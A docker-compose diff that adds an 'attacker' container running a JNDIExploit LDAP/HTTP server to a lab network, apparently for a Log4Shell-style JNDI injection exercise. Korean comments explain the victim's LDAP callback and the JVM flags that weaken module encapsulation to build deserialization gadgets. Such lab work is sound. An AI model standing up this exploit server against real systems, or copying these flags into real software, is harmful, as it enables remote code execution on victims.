@@ -45,3 +45,12 @@ services:
     networks: [labnet]
     ports:
       - "8082:8080"
+
+  attacker:                 # 공격자(담당 B): JNDIExploit LDAP+HTTP 서버. 피해자가 ldap://attacker:1389 로 호출
+    image: sickcodes/jndiexploit
+    container_name: attacker
+    networks: [labnet]
+    environment:
+      # JNDIExploit 은 JDK8 용 도구 => 최신 JDK 모듈 캡슐화 우회를 위한 add-opens/add-exports (조건3 가젯 생성용)
+      - "JAVA_TOOL_OPTIONS=--add-opens=java.base/java.lang=ALL-UNNAMED --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED"
+    command: ["/bin/bash", "-c", "java -jar ./JNDIExploit-1.2-SNAPSHOT.jar --ip attacker --ldapPort 1389 --httpPort 80"]
